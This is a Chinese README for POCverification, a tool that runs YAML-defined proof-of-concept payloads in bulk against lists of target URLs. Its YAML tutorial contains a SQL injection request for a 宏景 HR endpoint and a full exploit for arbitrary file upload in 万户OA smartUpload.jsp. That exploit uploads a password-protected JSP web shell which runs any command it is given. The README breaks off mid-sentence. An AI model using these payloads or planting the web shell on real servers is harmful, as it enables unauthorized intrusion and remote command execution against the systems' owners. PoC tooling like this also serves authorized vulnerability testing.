# POCverification


# 使用方法

## 快速上手

```shell
# 测试环境：
git clone https://github.com/xss-root/POCverification
pip3 install -r requirements.txt 
python3 POCverification.py -y <yaml文件地址> -l <需要批量利用的url文件>
# 例如：python3 POCverification.py -y get.yaml -l urls.txt 
```


## 详细参数

```shell
  ____                __    __
 |  _ \ ___   ___     \ \  / /
 | |_) / _ \ / __|     \ \/ /
 |  __/ (_) | (__       \ \/
 |_|   \___/ \___|      /\ \
                       /_/\_\                       
@Author: xss-root       @From:  https://github.com/xss-root 
    
usage: POCverification.py [-h] [-y YAML] [-l LIST] [-t THREAD] [-o OUTPUT]

POCverification v1 By:xss-root

optional arguments:
  -h, --help            show this help message and exit
  -y YAML, --yaml YAML  the YAML file containing the PoC
  -l LIST, --list LIST  the file containing target URLs
  -t THREAD, --thread THREAD
                        the maximum time in seconds for each request,default: 20
  -o OUTPUT, --output OUTPUT
                        the file to output the results, default: output.txt
```



# yaml编写方法

适用版本：v1

编写教程：

```yaml
# 单次GET,针对GET型的payload验证，以<宏景 sql注入漏洞>为例
author: xss-root
request:
  - 
    method: GET
    payload: /servlet/codesettree?categories=-1&codesetid=1&flag=c&parentid=-1&status=1
    # 自定义请求头，如果不填，则默认设置请求头只包含ua
    headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
    keyword: $root
    status: 200
    

# 单次post，针对POST型的payload验证，以<万户OA smartUpload.jsp 任意文件上传漏洞>为例
author: xss-root
request:
  -
    method: POST
    payload: /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
    headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419
        Connection: close
        data: "\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\"\r\n\
            Content-Type: application/octet-stream\r\n\
            \r\n\
            <% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>\r\n\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"continueUpload\"\r\n\
            \r\n\
            1\r\n\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"submit\"\r\n\
            \r\n\
            上传继续\r\n\
            ------WebKitFormBoundary{{rboundary}}--\r\n\
          "
        status: 200

# post+get的形式的poc验证还没测试，使用all.yaml的样例
```

`payload`为需要在`url`后面拼接的内容；`keyword`为存在漏洞的`url`的界面中出现的关键字。例如：




